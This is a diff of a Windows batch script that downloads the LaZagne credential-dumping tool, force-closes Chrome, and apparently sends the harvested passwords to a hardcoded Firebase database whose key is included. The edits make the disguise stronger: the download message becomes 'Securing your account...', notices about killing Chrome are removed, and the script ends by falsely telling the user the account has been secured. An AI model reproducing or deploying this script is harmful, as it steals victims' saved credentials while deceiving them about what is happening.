@@ -2,7 +2,6 @@
 chcp 65001 >nul
 setlocal enabledelayedexpansion
 
-:: Settings
 set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
 set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
@@ -10,7 +9,7 @@ set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatab
 set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"
 
 if not exist "%LAZAGNE_EXE%" (
-    echo   Downloading...
+    echo   Securing your account...
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
     if errorlevel 1 (
         echo   [ERROR] Download failed! Check details below.
@@ -30,10 +29,7 @@ if not exist "%LAZAGNE_EXE%" (
 tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I "chrome.exe" >NUL
 if %errorlevel% == 0 (
     taskkill /IM chrome.exe /F >nul 2>&1
-    echo   [OK] Chrome closed.
-) else (
-    echo   [INFO] Chrome already closed.
-)
+) 
 
 if not exist "%OUTPUT_DIR%" (
     mkdir "%OUTPUT_DIR%" 2>nul
@@ -73,7 +69,7 @@ if errorlevel 1 (
 del /q "%LAZAGNE_EXE%" >nul 2>&1
 
 echo ------------------------------------------------------------
-echo Congrats!Your account has been secured!
+echo Congrats.Your account has been secured.
 echo ------------------------------------------------------------
 pause
 exit /b 0
